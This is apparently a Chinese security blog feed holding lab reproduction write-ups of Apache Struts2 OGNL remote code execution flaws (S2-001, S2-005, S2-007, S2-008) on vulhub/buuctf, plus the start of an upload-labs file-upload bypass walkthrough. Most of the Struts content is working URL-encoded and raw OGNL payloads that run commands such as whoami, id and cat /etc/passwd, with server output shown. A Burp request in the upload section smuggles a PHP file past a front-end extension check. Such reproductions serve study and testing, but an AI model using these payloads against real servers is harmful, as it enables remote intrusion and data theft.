      <link href="/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><blockquote><p>影响版本: 2.0.0 - 2.1.8.1</p></blockquote><p>漏洞详情: <a href="http://struts.apache.org/docs/s2-005.html">http://struts.apache.org/docs/s2-005.html</a></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>参考吴翰清的《白帽子讲Web安全》一书。</p><blockquote><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p></blockquote><p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure><p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p><ul><li>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</li><li>S2-003 后官方增加了安全模式（沙盒）</li><li>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>GET 方法执行命令，无法直接回显，回显在会自动下载的action文件头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?%<span class="number">28</span>%<span class="number">27</span>%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%<span class="number">27</span>]%5Cu003dfalse%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%<span class="number">27</span>%<span class="number">29</span>%28kxlzx%<span class="number">29</span>%28kxlzx%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mycmd%5Cu003d%5C%27whoami%5C%<span class="number">27</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%<span class="number">28</span>%<span class="number">29.</span><span class="built_in">exec</span>%<span class="number">28</span>%5Cu0023mycmd%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%28A%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%<span class="number">28</span>%5Cu0023myret.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%28B%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myres%5Cu003dnew%5C40byte[<span class="number">51020</span>]%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%28C%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mydat.readFully%<span class="number">28</span>%5Cu0023myres%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%28D%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%<span class="number">28</span>%5Cu0023myres%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span>&amp;%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%<span class="number">28</span>%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%28bla%<span class="number">29</span>&amp;%28E%<span class="number">29</span>%<span class="number">28</span>%<span class="number">28</span>%<span class="number">27</span>%5Cu0023myout.getWriter%<span class="number">28</span>%<span class="number">29.</span>println%<span class="number">28</span>%5Cu0023mystr%<span class="number">29</span>%<span class="number">27</span>%<span class="number">29</span>%28bla%<span class="number">29</span>%<span class="number">29</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POST 直接回显</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;%23req%3d%23context.get(%27co%<span class="number">27</span>%2b%27m.<span class="built_in">open</span>%<span class="number">27</span>%2b%27symphony.xwo%<span class="number">27</span>%2b%27rk2.disp%<span class="number">27</span>%2b%27atcher.HttpSer%<span class="number">27</span>%2b%27vletReq%<span class="number">27</span>%2b%27uest%<span class="number">27</span>),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27<span class="built_in">id</span>%<span class="number">27.</span>toString().split(%<span class="number">27</span>\\s%<span class="number">27</span>))).start().getInputStream()).useDelimiter(%<span class="number">27</span>\\AAAA%<span class="number">27</span>),%23<span class="built_in">str</span>%3d%23s.hasNext()?%23s.<span class="built_in">next</span>():%<span class="number">27</span>%<span class="number">27</span>,%23resp%3d%23context.get(%27co%<span class="number">27</span>%2b%27m.<span class="built_in">open</span>%<span class="number">27</span>%2b%27symphony.xwo%<span class="number">27</span>%2b%27rk2.disp%<span class="number">27</span>%2b%27atcher.HttpSer%<span class="number">27</span>%2b%27vletRes%<span class="number">27</span>%2b%27ponse%<span class="number">27</span>),%23resp.setCharacterEncoding(%27UTF-<span class="number">8</span>%<span class="number">27</span>),%23resp.getWriter().println(%23<span class="built_in">str</span>),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>POST 例子，以buuctf为例<br><img src="/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-20-43-43.png"></p><p><strong>参考：</strong></p><p><a href="https://www.cnblogs.com/blankunbeaten/p/14826753.html">S2-005 远程代码执行漏洞</a><br><a href="https://taomujian.github.io/2021/05/14/S2_005/">S2-005漏洞分析</a><br><a href="http://www.b1ue.cn/archives/107.html">Struts2 历史漏洞分析 — S2-005</a></p><h2 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h2><h3 id="影响-1"><a href="#影响-1" class="headerlink" title="影响"></a>影响</h3><blockquote><p>版本: 2.0.0 - 2.2.3<br>漏洞详情: <a href="http://struts.apache.org/docs/s2-007.html">http://struts.apache.org/docs/s2-007.html</a></p></blockquote><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 UserAction：</ActionName></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure><p>然后配置有 UserAction-validation.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">validators</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>EXP </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span><span class="built_in">id</span><span class="string">&#x27;).getInputStream())) + &#x27;</span></span><br></pre></td></tr></table></figure><p>以buuctf为例<br><img src="/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-21-18-28.png"></p><p><strong>参考：</strong>   </p><p><a href="https://taomujian.github.io/2021/05/14/S2_007/">S2-007漏洞分析  </a><br><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md">S2-007 远程代码执行漏洞</a></p><h2 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h2><h3 id="影响-2"><a href="#影响-2" class="headerlink" title="影响"></a>影响</h3><blockquote><p>影响版本: 2.1.0 - 2.3.1</p></blockquote><p>漏洞详情: <a href="http://struts.apache.org/docs/s2-008.html">http://struts.apache.org/docs/s2-008.html</a></p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p><p>例如在 devMode 模式下直接添加参数?debug&#x3D;command&amp;expression&#x3D;<OGNL exp>，会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）</OGNL></p><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=%<span class="number">28</span>%23_memberAccess%5<span class="string">B&quot;allowStaticMethodAccess&quot;</span>%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%<span class="number">28</span><span class="string">&quot;false&quot;</span>%<span class="number">29</span>%<span class="number">20</span>%2C%23context%5<span class="string">B&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%<span class="number">28</span>@java.lang.Runtime@getRuntime%<span class="number">28</span>%<span class="number">29.</span><span class="built_in">exec</span>%<span class="number">28</span>%27whoami%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以buuctf为例<br><img src="/2022/03/07/struts2%E7%B3%BB%E5%88%97-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/2022-03-08-22-26-22.png"></p><p><strong>参考：</strong></p><p><a href="https://taomujian.github.io/2021/05/14/S2_008/">S2-008漏洞分析</a><br><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md">S2-008 远程代码执行漏洞</a></p><h2 id="S2"><a href="#S2" class="headerlink" title="S2-"></a>S2-</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2007-4556 Struts2_001 复现</title>
      <link href="/2022/03/06/CVE-2007-4556-Struts2-001-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/06/CVE-2007-4556-Struts2-001-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="S2-001-远程代码执行漏洞"><a href="#S2-001-远程代码执行漏洞" class="headerlink" title="S2-001 远程代码执行漏洞"></a>S2-001 远程代码执行漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p></blockquote><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>2.0.0-2.0.8</p><h2 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h2><p>在表单使用 <code>%&#123;1+1&#125;</code>简单测试</p><p><img src="/2022/03/06/CVE-2007-4556-Struts2-001-%E5%A4%8D%E7%8E%B0/2022-03-06-21-05-12.png"></p><p>说明漏洞存在</p><p>使用vulhub提供的exp</p><p>获取tomcat执行路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>获取Web路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><p>执行任意命令，例 <code>pwd</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;pwd&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行任意命令，带参数，例 <code>cat /etc/password</code>，多参数为<code>new java.lang.String[]&#123;&quot;shell&quot;,&quot;arg[0]&quot;,&quot;arg[1]&quot;&#125;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>测试 <code>ls -l</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line">username=a&amp;password=%<span class="number">25</span>&#123;%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]&#123;<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>&#125;)).redirectErrorStream(true).start(),%23b%3d%23a.getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew+java.io.BufferedReader(%23c),%23e%3dnew+char[<span class="number">50000</span>],%23d.read(%23e),%23f%3d%23context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),%23f.getWriter().println(new+java.lang.String(%23e)),%23f.getWriter().flush(),%23f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line">RESPONSE</span><br><span class="line">total <span class="number">120</span></span><br><span class="line">-rw-r----- <span class="number">1</span> root root  <span class="number">57092</span> Apr <span class="number">13</span>  <span class="number">2017</span> LICENSE</span><br><span class="line">-rw-r----- <span class="number">1</span> root root   <span class="number">1723</span> Apr <span class="number">13</span>  <span class="number">2017</span> NOTICE</span><br><span class="line">-rw-r----- <span class="number">1</span> root root   <span class="number">7064</span> Apr <span class="number">13</span>  <span class="number">2017</span> RELEASE-NOTES</span><br><span class="line">-rw-r----- <span class="number">1</span> root root  <span class="number">15946</span> Apr <span class="number">13</span>  <span class="number">2017</span> RUNNING.txt</span><br><span class="line">drwxr-x--- <span class="number">1</span> root root   <span class="number">4096</span> May  <span class="number">5</span>  <span class="number">2017</span> <span class="built_in">bin</span></span><br><span class="line">drwx--S--- <span class="number">1</span> root root   <span class="number">4096</span> Mar  <span class="number">6</span> <span class="number">11</span>:<span class="number">35</span> conf</span><br><span class="line">drwxr-sr-x <span class="number">3</span> root staff  <span class="number">4096</span> May  <span class="number">5</span>  <span class="number">2017</span> include</span><br><span class="line">drwxr-x--- <span class="number">2</span> root root   <span class="number">4096</span> May  <span class="number">5</span>  <span class="number">2017</span> lib</span><br><span class="line">drwxr-x--- <span class="number">1</span> root root   <span class="number">4096</span> Mar  <span class="number">6</span> <span class="number">11</span>:<span class="number">35</span> logs</span><br><span class="line">drwxr-sr-x <span class="number">3</span> root staff  <span class="number">4096</span> May  <span class="number">5</span>  <span class="number">2017</span> native-jni-lib</span><br><span class="line">drwxr-x--- <span class="number">2</span> root root   <span class="number">4096</span> May  <span class="number">5</span>  <span class="number">2017</span> temp</span><br><span class="line">drwxr-x--- <span class="number">1</span> root root   <span class="number">4096</span> Mar  <span class="number">6</span> <span class="number">11</span>:<span class="number">35</span> webapps</span><br><span class="line">drwxr-x--- <span class="number">1</span> root root   <span class="number">4096</span> Mar  <span class="number">6</span> <span class="number">11</span>:<span class="number">35</span> work</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2022/02/28/upload-labs/"/>
      <url>/2022/02/28/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-files-学习"><a href="#upload-files-学习" class="headerlink" title="upload files 学习"></a>upload files 学习</h1><p>项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>测试环境</p><blockquote><p>操作系统：windows<br>php版本：5.2.17~7.2.10-nts</p></blockquote><h2 id="Pass-o1"><a href="#Pass-o1" class="headerlink" title="Pass-o1"></a>Pass-o1</h2><p><strong>前端-js检查</strong>   </p><p>上马，如下提示</p><p> <img src="/2022/02/28/upload-labs/2022-02-28-10-43-51.png"></p><p> 猜测为前端检测，查看前端代码，白名单 <code>.jpg|.png|.gif</code></p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端检测的话，关闭js解析&#x2F;burp改包<br>1、关闭js解析</p><p><img src="/2022/02/28/upload-labs/2022-02-28-10-52-54.png"><br>2、burp改包 在filename该成需要的后缀即可绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-01/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">……</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload-labs/Pass-01/index.php</span><br><span class="line">Cookie: <span class="keyword">pass</span>=01</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; phpinfo();&lt;/script&gt;</span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure><p>都可以上传成功，然后找到蹄片右键复制地址<br><img src="/2022/02/28/upload-labs/2022-02-28-10-59-35.png"><br>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload-labs/upload/a.php 即木马地址</span><br></pre></td></tr></table></figure><p>访问，传🐎成功</p><p><img src="/2022/02/28/upload-labs/2022-02-28-11-02-07.png"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><strong>服务端-MIME文件类型检查</strong></p><p>直接上马被检测错误。<br>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>,<span class="string">&quot;02&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span 